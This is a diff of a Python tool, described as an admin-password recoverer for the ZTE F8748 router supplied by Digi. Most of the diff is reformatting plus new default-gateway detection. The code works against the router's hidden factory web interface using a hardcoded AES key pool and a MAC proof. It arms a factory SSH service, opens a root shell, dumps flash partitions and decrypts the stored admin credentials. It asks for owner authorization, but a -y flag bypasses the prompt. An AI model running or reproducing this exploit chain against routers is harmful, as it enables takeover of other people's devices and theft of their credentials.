@@ -33,6 +33,7 @@ Usage examples
   ./digi-f8748.py disarm                    # closes factory SSH
   ./digi-f8748.py recover                   # all of the above in sequence
 """
+
 from __future__ import annotations
 
 import argparse
@@ -53,15 +54,21 @@ from pathlib import Path
 try:
     import requests
 except ImportError:
-    sys.exit("Missing dependency 'requests'. Run: pip install requests paramiko pycryptodome")
+    sys.exit(
+        "Missing dependency 'requests'. Run: pip install requests paramiko pycryptodome"
+    )
 try:
     import paramiko
 except ImportError:
-    sys.exit("Missing dependency 'paramiko'. Run: pip install requests paramiko pycryptodome")
+    sys.exit(
+        "Missing dependency 'paramiko'. Run: pip install requests paramiko pycryptodome"
+    )
 try:
     from Crypto.Cipher import AES
 except ImportError:
-    sys.exit("Missing dependency 'pycryptodome'. Run: pip install requests paramiko pycryptodome")
+    sys.exit(
+        "Missing dependency 'pycryptodome'. Run: pip install requests paramiko pycryptodome"
+    )
 
 TOOL = "digi-f8748"
 VERSION = "0.0.4"
@@ -72,15 +79,15 @@ MAX_XML_BYTES = 262144
 # --------------------------------------------------------------------------
 ALPHABET = "lmaoztebcdfghijknpqrsuvwxy"
 RSA_E = 5767
-RSA_N = 30049                      # toy RSA: pow(x, 5767, 30049)
-FNV_PRIME = 16777619               # index mixer (FNV-32 prime)
+RSA_N = 30049  # toy RSA: pow(x, 5767, 30049)
+FNV_PRIME = 16777619  # index mixer (FNV-32 prime)
 INDEX_MASK = 2147483711
 KEY_POOL = bytes.fromhex(
     "9c3375d11c424537184891731745794443d7d573335476d2c5f12c4f7aba61d9"
     "5c69df8cd21cde3b352d2fe1de4c77f51a65d1fe18438ea742080478d5e4f33"
     "4a4d3f236476d869d42651342dc429948dc679f9edc46375f849f6f76ce794f49"
 )
-DEFAULT_VID = "108"                # fallback board vid if boardtype read fails
+DEFAULT_VID = "108"  # fallback board vid if boardtype read fails
 
 HARDCODE_MAGIC = b"\x01\x02\x03\x04"
 ZTE_DATA_MARKER = b"\x85\x19\x02\xe0"
@@ -94,10 +101,17 @@ HC_PASS_KEY = "SSH_PassWord_2009"
 # Flash windows scanned for the hardcode seed + oss container (offset, size)
 DUMP_DEVICES = ["/dev/mtd9", "/dev/mtd8", "/dev/mtd10", "/dev/mtd7"]
 DUMP_WINDOWS = [
-    (0x980000, 0x40000), (0x9C0000, 0x40000), (0xA00000, 0x40000),
-    (0xA40000, 0x40000), (0xA80000, 0x40000), (0x900000, 0x40000),
-    (0x940000, 0x40000), (0xAC0000, 0x40000), (0xB00000, 0x40000),
-    (0x800000, 0x40000), (0x880000, 0x40000),
+    (0x980000, 0x40000),
+    (0x9C0000, 0x40000),
+    (0xA00000, 0x40000),
+    (0xA40000, 0x40000),
+    (0xA80000, 0x40000),
+    (0x900000, 0x40000),
+    (0x940000, 0x40000),
+    (0xAC0000, 0x40000),
+    (0xB00000, 0x40000),
+    (0x800000, 0x40000),
+    (0x880000, 0x40000),
 ]
 DUMP_CHUNKS = [8192, 4096, 2048]
 
@@ -173,7 +187,9 @@ def local_mac_for(host: str) -> str:
     if not ip:
         return ""
     try:
-        out = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=5).stdout
+        out = subprocess.run(
+            ["ifconfig"], capture_output=True, text=True, timeout=5
+        ).stdout
         for block in re.split(r"\n(?=\w)", out):
             if f"inet {ip} " in block:
                 m = re.search(r"ether ([0-9a-f:]{17})", block)
@@ -183,7 +199,9 @@ def local_mac_for(host: str) -> str:
         pass
     if sys.platform.startswith("linux"):
         try:
-            out = subprocess.run(["ip", "-4", "addr", "show"], capture_output=True, text=True, timeout=5).stdout
+            out = subprocess.run(
+                ["ip", "-4", "addr", "show"], capture_output=True, text=True, timeout=5
+            ).stdout
             for block in re.split(r"\n(?=\d+:)", out):
                 if f"inet {ip} " in block:
                     m = re.search(r"link/ether ([0-9a-f:]{17})", block)
@@ -196,12 +214,17 @@ def local_mac_for(host: str) -> str:
 
 def arp_mac_for(host: str) -> str:
     # populate/refresh the ARP cache first; a cold cache yields "(incomplete)"
-    ping_flags = (["-c", "1", "-W", "1"] if sys.platform.startswith("linux")
-                  else ["-c", "1", "-t", "1"])
+    ping_flags = (
+        ["-c", "1", "-W", "1"]
+        if sys.platform.startswith("linux")
+        else ["-c", "1", "-t", "1"]
+    )
     subprocess.run(["ping"] + ping_flags + [host], capture_output=True, timeout=5)
     if sys.platform.startswith("linux"):
         try:
-            out = subprocess.run(["ip", "neigh", "show"], capture_output=True, text=True, timeout=5).stdout
+            out = subprocess.run(
+                ["ip", "neigh", "show"], capture_output=True, text=True, timeout=5
+            ).stdout
             for line in out.splitlines():
                 f = line.split()
                 if len(f) >= 5 and f[0] == host and ":" in f[4]:
@@ -217,7 +240,9 @@ def arp_mac_for(host: str) -> str:
             pass
         return ""
     try:
-        out = subprocess.run(["arp", "-n", host], capture_output=True, text=True, timeout=5).stdout
+        out = subprocess.run(
+            ["arp", "-n", host], capture_output=True, text=True, timeout=5
+        ).stdout
     except Exception:
         return ""
     m = re.search(r"\(([0-9.]+)\) at ([0-9a-f:]{17})", out)
@@ -231,11 +256,14 @@ def arp_mac_for(host: str) -> str:
 def _alphabet_ints(alphabet: str, length: int):
     ab = alphabet.encode("utf-8")
     import itertools
+
     for combo in itertools.product(ab, repeat=length):
         yield int.from_bytes(bytes(combo), "little")
 
 
-def evaluate_alphabet(alphabet: str, exponent: int, modulus: int, value_map=lambda x: x) -> dict:
+def evaluate_alphabet(
+    alphabet: str, exponent: int, modulus: int, value_map=lambda x: x
+) -> dict:
     wanted = set()
     for i in range(modulus):
         wanted.add(value_map(pow(i, exponent, modulus)))
@@ -312,24 +340,36 @@ class WebFac:
             raise RuntimeError(f"webFac gave no re_rand (HTTP {r.status_code})")
         self.server_rand = int(m.group(1))
         index = ((FNV_PRIME * self.client_rand) & INDEX_MASK ^ self.server_rand) % 60
-        key = bytes(b ^ 0xA5 for b in KEY_POOL[index : index + 24])  # httpd XORs the pool
+        key = bytes(
+            b ^ 0xA5 for b in KEY_POOL[index : index + 24]
+        )  # httpd XORs the pool
         self.aes = AES.new(key, AES.MODE_ECB)
-        return {"server_rand": self.server_rand, "key_index": index,
-                "key_hex": key.hex(), "status": r.status_code}
+        return {
+            "server_rand": self.server_rand,
+            "key_index": index,
+            "key_hex": key.hex(),
+            "status": r.status_code,
+        }
 
     def send(self, plaintext: bytes) -> bytes:
         """Send one AES-ECB-encrypted command over /webFacEntry."""
         if self.aes is None:
             raise RuntimeError("handshake() must run first")
-        r = self.s.post(f"{self.base}/webFacEntry", data=self.aes.encrypt(pad16(plaintext)),
-                        timeout=10, allow_redirects=False)
+        r = self.s.post(
+            f"{self.base}/webFacEntry",
+            data=self.aes.encrypt(pad16(plaintext)),
+            timeout=10,
+            allow_redirects=False,
+        )
         return r.content
 
     def mac_proof(self, br0_mac: bytes, client_mac: bytes) -> bytes:
         return self.send(info_message(create_payload(br0_mac, client_mac)))
 
     def login(self) -> None:
-        self.send(f"CheckLoginAuth.gch?version50&user={self.web_user}&pass={self.web_pass}".encode())
+        self.send(
+            f"CheckLoginAuth.gch?version50&user={self.web_user}&pass={self.web_pass}".encode()
+        )
 
     def factory_mode(self, mode: int, settle_s: float = 2.0) -> tuple[str, str]:
         """mode=2 arms the factory Dropbear; mode=0 closes it (FactoryMode.gch?close —
@@ -345,7 +385,9 @@ class WebFac:
             if mode == 0:
                 time.sleep(settle_s)
                 return ("", "")
-            raise RuntimeError("FactoryMode returned no credentials (MAC proof failed?)")
+            raise RuntimeError(
+                "FactoryMode returned no credentials (MAC proof failed?)"
+            )
         user = um.group(1).decode("latin1")
         pw = um.group(2).decode("latin1")
         time.sleep(settle_s)
@@ -364,7 +406,9 @@ def ssh_connect(host: str, user: str, pw: str, timeout: float = 15.0):
     return t
 
 
-def open_root_shell(host: str, user: str, pw: str, attempts: int = 5, timeout: float = 15.0):
+def open_root_shell(
+    host: str, user: str, pw: str, attempts: int = 5, timeout: float = 15.0
+):
     last = "not attempted"
     for i in range(1, attempts + 1):
         try:
@@ -428,7 +472,9 @@ def hex_from_shell(text: str) -> bytes:
         return b""
 
 
-def mtd_pull(chan, dev: str, offset: int, size: int, chunk: int, tmp: str = "/var/tmp/digi.bin") -> bytes:
+def mtd_pull(
+    chan, dev: str, offset: int, size: int, chunk: int, tmp: str = "/var/tmp/digi.bin"
+) -> bytes:
     data = bytearray()
     n = (size + chunk - 1) // chunk
     for i in range(n):
@@ -511,14 +557,24 @@ def dump_router(host: str, ssh_user: str, ssh_pass: str, out_dir: Path) -> dict:
                 break
         if not (pt.startswith(b"TAGH") and len(pt) >= 64):
             found_pt = False
-            for dev in ("/dev/mtd1", "/dev/mtd2", "/dev/mtd3", "/dev/mtd4", "/dev/mtd5"):
+            for dev in (
+                "/dev/mtd1",
+                "/dev/mtd2",
+                "/dev/mtd3",
+                "/dev/mtd4",
+                "/dev/mtd5",
+            ):
                 if found_pt:
                     break
                 for size in (2048, 4096, 8192, 16384):
-                    meta = shell_read(ch, f"mtd_debug read {dev} 0 {size} /var/tmp/digi_pt.bin", 12)
+                    meta = shell_read(
+                        ch, f"mtd_debug read {dev} 0 {size} /var/tmp/digi_pt.bin", 12
+                    )
                     if "Copied" not in meta:
                         continue
-                    text = shell_read(ch, "hexdump -ve '1/1 \"%02x\"' /var/tmp/digi_pt.bin", 40)
+                    text = shell_read(
+                        ch, "hexdump -ve '1/1 \"%02x\"' /var/tmp/digi_pt.bin", 40
+                    )
                     cand = hex_from_shell(text)
                     if cand.startswith(b"TAGH") and len(cand) >= 64:
                         pt = cand
@@ -625,7 +681,7 @@ def derive_hardcode_aes(seed_line) -> tuple[bytes, bytes]:
 
 def _pkcs_unpad(pt: bytes) -> bytes:
     if pt and 1 <= pt[-1] <= 16 and pt.endswith(bytes([pt[-1]]) * pt[-1]):
-        return pt[:-pt[-1]]
+        return pt[: -pt[-1]]
     return pt
 
 
@@ -703,8 +759,13 @@ def parse_paramtag(blob: bytes, vid: str) -> list:
         if ln < 0 or ln > 4096:
             break
         npos = (pos + ln + 9) & ~3
-        rec = {"id": pid, "id_hex": hex(pid), "pos": hex(pos), "length": ln,
-               "enc": (f6 == 0 and f8 == 1)}
+        rec = {
+            "id": pid,
+            "id_hex": hex(pid),
+            "pos": hex(pos),
+            "length": ln,
+            "enc": (f6 == 0 and f8 == 1),
+        }
         if rec["enc"]:
             raw = _paramtag_decrypt(blob[pos + 10 : npos], key, iv)
             if raw is not None:
@@ -720,7 +781,9 @@ def parse_paramtag(blob: bytes, vid: str) -> list:
     return out
 
 
-def map_admin_credentials(seed_path: Path, oss_path: Path, paramtag_path: Path | None, vid: str) -> dict:
+def map_admin_credentials(
+    seed_path: Path, oss_path: Path, paramtag_path: Path | None, vid: str
+) -> dict:
     seed = normalize_seed_line(seed_path.read_bytes())
     oss = parse_kv_catalog(decrypt_hardcode_container(oss_path.read_bytes(), seed))
     rows = parse_paramtag(paramtag_path.read_bytes(), vid) if paramtag_path else []
@@ -738,8 +801,12 @@ def map_admin_credentials(seed_path: Path, oss_path: Path, paramtag_path: Path |
     return {
         "username": username,
         "password": password,
-        "user_source": f"paramtag:{hex(TAG_USERNAME)}" if tag_user.get("value") else f"hardcode:{HC_USER_KEY}",
-        "pass_source": f"paramtag:{hex(TAG_PASSWORD)}" if tag_pass.get("value") else f"hardcode:{HC_PASS_KEY}",
+        "user_source": f"paramtag:{hex(TAG_USERNAME)}"
+        if tag_user.get("value")
+        else f"hardcode:{HC_USER_KEY}",
+        "pass_source": f"paramtag:{hex(TAG_PASSWORD)}"
+        if tag_pass.get("value")
+        else f"hardcode:{HC_PASS_KEY}",
         "vid": vid,
         "oss_keys": sorted(oss.keys()),
         "paramtag_ids": sorted({r["id"] for r in rows}),
@@ -749,7 +816,9 @@ def map_admin_credentials(seed_path: Path, oss_path: Path, paramtag_path: Path |
 # --------------------------------------------------------------------------
 # Web login verification + router info
 # --------------------------------------------------------------------------
-def verify_web_admin(host: str, username: str, password: str, timeout: float = 15.0) -> dict:
+def verify_web_admin(
+    host: str, username: str, password: str, timeout: float = 15.0
+) -> dict:
     validate_host(host)
     base = f"http://{host}"
     s = requests.Session()
@@ -759,8 +828,14 @@ def verify_web_admin(host: str, username: str, password: str, timeout: float = 1
     j = r.json()
     token = j.get("sess_token")
     if j.get("lockingTime") and int(j.get("lockingTime") or 0) > 0:
-        return {"ok": False, "error": "login_locked", "lockingTime": j.get("lockingTime")}
-    xml_bytes = http_get(s, base + "/?_type=loginData&_tag=login_token", timeout).content
+        return {
+            "ok": False,
+            "error": "login_locked",
+            "lockingTime": j.get("lockingTime"),
+        }
+    xml_bytes = http_get(
+        s, base + "/?_type=loginData&_tag=login_token", timeout
+    ).content
     root = parse_router_xml(xml_bytes)
     salt = (root.text or "").strip()
     if not salt:
@@ -771,15 +846,27 @@ def verify_web_admin(host: str, username: str, password: str, timeout: float = 1
     if not salt:
         return {"ok": False, "error": "no_login_token"}
     pw_hash = hashlib.sha256((password + salt).encode("utf-8")).hexdigest()
-    r = http_post(s, base + "/?_type=loginData&_tag=login_entry", timeout,
-                  data={"action": "login", "Username": username, "Password": pw_hash,
-                        "_sessionTOKEN": token or ""})
+    r = http_post(
+        s,
+        base + "/?_type=loginData&_tag=login_entry",
+        timeout,
+        data={
+            "action": "login",
+            "Username": username,
+            "Password": pw_hash,
+            "_sessionTOKEN": token or "",
+        },
+    )
     try:
         body = r.json()
     except Exception:
         return {"ok": False, "error": "bad_login_response"}
     if body.get("loginErrMsg"):
-        return {"ok": False, "error": "login_rejected", "loginErrMsg": body.get("loginErrMsg")}
+        return {
+            "ok": False,
+            "error": "login_rejected",
+            "loginErrMsg": body.get("loginErrMsg"),
+        }
     html = http_get(s, base + "/", timeout).text
     m = re.search(r'curRight\s*=\s*"(\d+)"', html)
     cur = m.group(1) if m else None
@@ -793,9 +880,12 @@ def router_info(host: str, timeout: float = 8.0) -> dict:
     info = {"host": host}
     try:
         import html as _html
+
         html = _html.unescape(http_get(None, base + "/", timeout).text)
         models = sorted(set(re.findall(r"F\d{4}[A-Z]?", html)))
-        versions = sorted(set(re.findall(r"\bV\d+\.\d+(?:\.\d+)*[A-Za-z]?\b", html[:20000])))[:8]
+        versions = sorted(
+            set(re.findall(r"\bV\d+\.\d+(?:\.\d+)*[A-Za-z]?\b", html[:20000]))
+        )[:8]
         if models:
             info["models"] = models
         if versions:
@@ -808,8 +898,19 @@ def router_info(host: str, timeout: float = 8.0) -> dict:
     try:
         r = http_get(None, base + "/?_type=loginData&_tag=login_entry", timeout)
         j = r.json()
-        keep = {k: j[k] for k in ("sessionId", "fosAddr", "modelName", "hardwareVersion",
-                                  "softwareVersion", "OriginContentType", "language") if k in j}
+        keep = {
+            k: j[k]
+            for k in (
+                "sessionId",
+                "fosAddr",
+                "modelName",
+                "hardwareVersion",
+                "softwareVersion",
+                "OriginContentType",
+                "language",
+            )
+            if k in j
+        }
         if keep:
             info["login_entry"] = keep
     except Exception:
@@ -821,19 +922,102 @@ def router_info(host: str, timeout: float = 8.0) -> dict:
 # CLI steps
 # --------------------------------------------------------------------------
 def common_args(p: argparse.ArgumentParser) -> None:
-    p.add_argument("--host", default="192.168.1.1", help="router IP (default 192.168.1.1)")
-    p.add_argument("--web-user", default="", help="normal web login user (prompted if omitted)")
-    p.add_argument("--web-pass", default="", help="normal web login password (prompted if omitted)")
-    p.add_argument("--client-rand", type=int, default=0, help="webFac client rand (default 0)")
-    p.add_argument("-y", "--yes", action="store_true", dest="yes",
-                   help="no pedir confirmaciones de autorización")
+    p.add_argument(
+        "--host", default="", help="router IP or hostname (overrides gateway detection)"
+    )
+    p.add_argument(
+        "--web-user", default="", help="normal web login user (prompted if omitted)"
+    )
+    p.add_argument(
+        "--web-pass", default="", help="normal web login password (prompted if omitted)"
+    )
+    p.add_argument(
+        "--client-rand", type=int, default=0, help="webFac client rand (default 0)"
+    )
+    p.add_argument(
+        "-y",
+        "--yes",
+        action="store_true",
+        dest="yes",
+        help="no pedir confirmaciones de autorización",
+    )
+
+
+def detect_default_gateway() -> str:
+    """Return the active Windows IPv4 default gateway, if one is available."""
+    if os.name != "nt":
+        return ""
+    command = (
+        "$r = Get-NetRoute -AddressFamily IPv4 -DestinationPrefix '0.0.0.0/0' "
+        "| Where-Object { $_.NextHop -and $_.NextHop -ne '0.0.0.0' } "
+        "| Sort-Object RouteMetric, InterfaceMetric "
+        "| Select-Object -First 1 -ExpandProperty NextHop; if ($r) { $r }"
+    )
+    try:
+        result = subprocess.run(
+            ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", command],
+            capture_output=True,
+            text=True,
+            timeout=5,
+            check=False,
+        )
+    except (OSError, subprocess.TimeoutExpired):
+        return ""
+    if result.returncode != 0:
+        return ""
+    gateway = result.stdout.strip().splitlines()
+    return gateway[0].strip() if gateway else ""
+
+
+def router_web_reachable(host: str) -> bool:
+    try:
+        response = requests.get(
+            f"http://{host}/",
+            timeout=3,
+            allow_redirects=False,
+            headers={"User-Agent": "Mozilla/5.0"},
+        )
+        response.close()
+        return True
+    except requests.exceptions.RequestException:
+        return False
+
+
+def resolve_router_host(host: str = "") -> str:
+    if host:
+        return validate_host(host)
+
+    gateway = detect_default_gateway()
+    if gateway and not HOST_RE.fullmatch(gateway):
+        gateway = ""
+    if gateway and router_web_reachable(gateway):
+        log(f"[*] Router detected at default gateway: {gateway}")
+        return gateway
+    if gateway:
+        log(f"[!] No responde la interfaz web en la puerta de enlace {gateway}.")
+    else:
+        log("[!] No se detecto una puerta de enlace IPv4 predeterminada.")
+    if not sys.stdin.isatty():
+        raise RuntimeError("indica la direccion del router con --host <direccion>")
+    prompt = f"Direccion IP o nombre del router [{gateway or 'manual'}]: "
+    try:
+        selected = input(prompt).strip()
+    except EOFError as exc:
+        raise RuntimeError(
+            "no se pudo leer la direccion; indica --host <direccion>"
+        ) from exc
+    if not selected:
+        raise RuntimeError("falta la direccion del router; indica --host <direccion>")
+    return validate_host(selected)
 
 
 def resolve_macs(args) -> tuple[bytes, bytes]:
     br0_hex = getattr(args, "router_mac", "") or arp_mac_for(args.host)
     cli_hex = getattr(args, "client_mac", "") or local_mac_for(args.host)
     if not br0_hex:
-        die("Router MAC unknown — pass --router-mac aa:bb:cc:dd:ee:ff (sticker or status page)")
+        die(
+            "Router MAC unknown — pass --router-mac aa:bb:cc:dd:ee:ff (sticker or status page)"
+        )
     if not cli_hex:
         die("Client MAC unknown — pass --client-mac aa:bb:cc:dd:ee:ff")
     log(f"[*] Router MAC (br0): {br0_hex}")
@@ -845,7 +1029,9 @@ def step_handshake(args, send_proof: bool = False) -> WebFac:
     br0, cli = resolve_macs(args)
     w = WebFac(args.host, args.web_user, args.web_pass, args.client_rand)
     hs = w.handshake()
-    log(f"[+] handshake ok: server_rand={hs['server_rand']} key_index={hs['key_index']} key={hs['key_hex']}")
+    log(
+        f"[+] handshake ok: server_rand={hs['server_rand']} key_index={hs['key_index']} key={hs['key_hex']}"
+    )
     arr = create_payload(br0, cli)
     msg = info_message(arr)
     log(f"[+] MAC proof ({len(arr)} words): {msg.decode()}")
@@ -864,7 +1050,9 @@ def cmd_info(args) -> None:
     log(f"[*] your IP on this LAN : {local_ip_for(args.host) or '?'}")
     log(f"[*] your client MAC     : {local_mac_for(args.host) or '?'}")
     log(f"[*] router MAC (ARP)    : {arp_mac_for(args.host) or '?'}")
-    log("[i] 'Router MAC' = sticker/ARP value above; 'Client MAC' = your MAC as the router lists it.")
+    log(
+        "[i] 'Router MAC' = sticker/ARP value above; 'Client MAC' = your MAC as the router lists it."
+    )
 
 
 def cmd_handshake(args) -> None:
@@ -882,9 +1070,15 @@ def ensure_web_credentials(args) -> None:
     try:
         login = verify_web_admin(args.host, args.web_user, args.web_pass)
     except Exception as e:
-        raise RuntimeError(f"normal web-login check failed before FactoryMode: {e}") from e
+        raise RuntimeError(
+            f"normal web-login check failed before FactoryMode: {e}"
+        ) from e
     if not login.get("ok"):
-        reason = login.get("loginErrMsg") or login.get("error") or "admin access was not confirmed"
+        reason = (
+            login.get("loginErrMsg")
+            or login.get("error")
+            or "admin access was not confirmed"
+        )
         raise RuntimeError(f"normal web-login rejected before FactoryMode: {reason}")
 
 
@@ -956,8 +1150,10 @@ def confirm_inside_git(cli_args, path: Path) -> None:
     if getattr(cli_args, "yes", False):
         return
     if not sys.stdin.isatty():
-        raise RuntimeError("la carpeta de salida está dentro de un repo git: "
-                           "confírmalo en una terminal o usa -y")
+        raise RuntimeError(
+            "la carpeta de salida está dentro de un repo git: "
+            "confírmalo en una terminal o usa -y"
+        )
     if input("¿Continuar de todos modos? [escribe SI] ").strip().upper() != "SI":
         raise RuntimeError("cancelado: no se volcará nada dentro de un repo git")
 
@@ -968,8 +1164,10 @@ def require_authorization(cli_args, what: str) -> None:
     if getattr(cli_args, "yes", False):
         return
     if not sys.stdin.isatty():
-        raise RuntimeError(f"para {what} se requiere confirmación interactiva "
-                           "(ejecútalo en una terminal) o el flag -y")
+        raise RuntimeError(
+            f"para {what} se requiere confirmación interactiva "
+            "(ejecútalo en una terminal) o el flag -y"
+        )
     print(f"Vas a {what} en {cli_args.host}.")
     print("Confirma que eres el propietario del router o que tienes autorización")
     print("expresa del propietario para gestionarlo.")
@@ -995,7 +1193,9 @@ def cmd_dump(args) -> None:
                 w.factory_mode(0, 1.2)
                 log("[+] factory SSH disarmed")
             except Exception as e:
-                log(f"[!] disarm failed ({e}) — reboot the router if port 22 stays open")
+                log(
+                    f"[!] disarm failed ({e}) — reboot the router if port 22 stays open"
+                )
 
 
 def cmd_decrypt(args) -> None:
@@ -1006,7 +1206,7 @@ def cmd_decrypt(args) -> None:
         if not p.is_file():
             die(f"missing {p} — run 'dump' first")
     pt_p = d / "paramtag.bin"
-    paramtag_p = pt_p if pt_p.is_file() else None   # paramtag opcional
+    paramtag_p = pt_p if pt_p.is_file() else None  # paramtag opcional
     bt = d / "boardtype.txt"
     vid = ""
     if bt.is_file():
@@ -1052,26 +1252,39 @@ def cmd_recover(args) -> None:
     log(f"[+] factory SSH armed — user: {fu}  pass: {fp}")
     try:
         results = dump_router(args.host, fu, fp, work)
-        needed = ("seed", "oss")   # paramtag es opcional (fallback hardcode)
+        needed = ("seed", "oss")  # paramtag es opcional (fallback hardcode)
         missing = [k for k in needed if k not in results]
         if missing:
-            raise RuntimeError(f"data collection incomplete (missing {', '.join(missing)})")
+            raise RuntimeError(
+                f"data collection incomplete (missing {', '.join(missing)})"
+            )
         vid = results.get("vid") or ""
         if not vid:
             bt = work / "boardtype.txt"
-            m = re.search(r"vid\s*:\s*(\d+)", bt.read_text(errors="ignore")) if bt.is_file() else None
+            m = (
+                re.search(r"vid\s*:\s*(\d+)", bt.read_text(errors="ignore"))
+                if bt.is_file()
+                else None
+            )
             vid = m.group(1) if m else DEFAULT_VID
         pt_work = work / "paramtag.bin"
-        creds = map_admin_credentials(work / "hardcode.seed", work / "oss.bin",
-                                      pt_work if pt_work.is_file() else None, vid)
+        creds = map_admin_credentials(
+            work / "hardcode.seed",
+            work / "oss.bin",
+            pt_work if pt_work.is_file() else None,
+            vid,
+        )
         log("== Admin credentials ==")
         log(f"  username: {creds['username']}   (source: {creds['user_source']})")
         log(f"  password: {creds['password']}   (source: {creds['pass_source']})")
         if not args.no_verify:
             log("[*] confirming web admin login…")
             res = verify_web_admin(args.host, creds["username"], creds["password"])
-            log("[+] web admin login confirmed (curRight=1)" if res.get("ok")
-                else f"[!] login not confirmed: {res}")
+            log(
+                "[+] web admin login confirmed (curRight=1)"
+                if res.get("ok")
+                else f"[!] login not confirmed: {res}"
+            )
     finally:
         log("[*] closing temporary access…")
         try:
@@ -1092,8 +1305,10 @@ BANNER = r"""
 
 
 def main(argv=None) -> int:
-    ap = argparse.ArgumentParser(prog=TOOL,
-                                 description=f"{TOOL} v{VERSION} — recuperador de la contraseña de administrador para el ZTE F8748 (Digi). Si estás aquí, es que la has perdido.")
+    ap = argparse.ArgumentParser(
+        prog=TOOL,
+        description=f"{TOOL} v{VERSION} — recuperador de la contraseña de administrador para el ZTE F8748 (Digi). Si estás aquí, es que la has perdido.",
+    )
     ap.add_argument("--version", action="version", version=f"{TOOL} {VERSION}")
     sub = ap.add_subparsers(dest="cmd", required=True)
 
@@ -1101,11 +1316,15 @@ def main(argv=None) -> int:
     common_args(p)
     p.set_defaults(fn=cmd_info)
 
-    p = sub.add_parser("handshake", help="webFac challenge + MAC proof (dry unless --send-proof)")
+    p = sub.add_parser(
+        "handshake", help="webFac challenge + MAC proof (dry unless --send-proof)"
+    )
     common_args(p)
     p.add_argument("--router-mac", default="", help="router br0 MAC")
     p.add_argument("--client-mac", default="", help="your MAC as the router sees it")
-    p.add_argument("--send-proof", action="store_true", help="actually send the proof message")
+    p.add_argument(
+        "--send-proof", action="store_true", help="actually send the proof message"
+    )
     p.set_defaults(fn=cmd_handshake)
 
     p = sub.add_parser("arm", help="arm factory SSH and print temporary credentials")
@@ -1116,7 +1335,9 @@ def main(argv=None) -> int:
     p.add_argument("--keep-ssh", action="store_true", help="leave factory SSH open")
     p.set_defaults(fn=cmd_arm)
 
-    p = sub.add_parser("dump", help="arm + pull seed/oss/paramtag/boardtype into --out dir")
+    p = sub.add_parser(
+        "dump", help="arm + pull seed/oss/paramtag/boardtype into --out dir"
+    )
     common_args(p)
     p.add_argument("--router-mac", default="")
     p.add_argument("--client-mac", default="")
@@ -1126,7 +1347,9 @@ def main(argv=None) -> int:
 
     p = sub.add_parser("decrypt", help="offline: dump dir → admin credentials")
     p.add_argument("--dir", default="digi-dump", help="dump directory")
-    p.add_argument("--vid", default="", help="board vid override (default: boardtype.txt or 108)")
+    p.add_argument(
+        "--vid", default="", help="board vid override (default: boardtype.txt or 108)"
+    )
     p.set_defaults(fn=cmd_decrypt)
 
     p = sub.add_parser("verify", help="test web admin login")
@@ -1150,9 +1373,10 @@ def main(argv=None) -> int:
     p.set_defaults(fn=cmd_recover)
 
     args = ap.parse_args(argv)
-    if hasattr(args, "host"):
-        validate_host(args.host)
     try:
+        if hasattr(args, "host"):
+            args.host = resolve_router_host(args.host)
+            log(f"[*] Router: {args.host}")
         args.fn(args)
     except KeyboardInterrupt:
         print("\n[!] interrupted — run 'disarm' to close factory SSH if it was armed")
